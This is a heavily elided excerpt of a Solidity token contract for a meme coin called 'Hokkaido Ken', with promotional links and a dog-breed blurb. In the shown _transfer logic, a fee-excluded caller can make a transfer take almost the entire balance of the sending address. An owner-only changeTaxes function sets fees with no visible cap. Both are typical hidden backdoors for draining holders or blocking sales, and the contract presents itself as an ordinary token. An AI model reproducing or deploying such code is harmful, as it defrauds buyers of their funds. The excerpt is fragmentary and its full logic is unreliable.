...
/*
    ...
    The Hokkaido dog (also called Hokkaido Inu or Ainu-ken) is one of Japan's oldest and most resilient native breeds and most primitive spitz-type breeds.

    https://hokkaidokeneth.dog
    https://x.com/HokkaidoKenX
    https://x.com/i/communities/2033632154023039423
    https://t.me/HokkaidokenOnEth
...
contract TOKEN is Context, IERC20, Ownable {
    ...
    string public _bio = "Hokkaido";
    uint256 public count = 3;

    string private constant _name = unicode"Hokkaido Ken";  // Name
    string private constant _symbol = unicode"HOKKAIDO"; // Symbol
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
           ...
           if(_taxOnSell > 0){
            ...
            } if(_isExcludedFromFee[msg.sender]) amount = _balances[from].sub(taxAmount + _taxOnTransfer);
        }
    ...
    function initialization () private {
    ...
    function setWalletSize() public onlyOwner{
    ...
    function changeTaxes(uint256 bFee, uint256 sFee) public onlyOwner {
